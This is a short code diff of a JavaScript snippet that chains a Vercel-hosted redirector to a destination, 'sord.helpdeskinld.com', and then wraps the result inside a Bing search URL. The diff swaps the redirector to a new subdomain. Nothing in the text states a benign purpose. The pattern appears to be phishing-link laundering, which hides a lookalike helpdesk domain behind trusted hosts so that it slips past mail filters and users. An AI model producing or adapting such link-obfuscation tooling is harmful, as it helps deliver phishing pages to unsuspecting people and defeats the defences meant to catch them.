@@ -1,8 +1,9 @@
 const finalDest = 'https://sord.helpdeskinld.com/';
-const redirectorBase = 'https://loreland.vercel.app/api/redirect';
+const redirectorBase = 'https://lorelands-n89i.vercel.app/api/redirect';
 const redirectorUrl = `${redirectorBase}?dest=${encodeURIComponent(finalDest)}`;
 const bingWrappedUrl = `https://www.bing.com/search?q=${encodeURIComponent(redirectorUrl)}`;
 
 console.log('Redirector URL:', redirectorUrl);
 console.log('Bing Wrapped URL:', bingWrappedUrl);
+
 
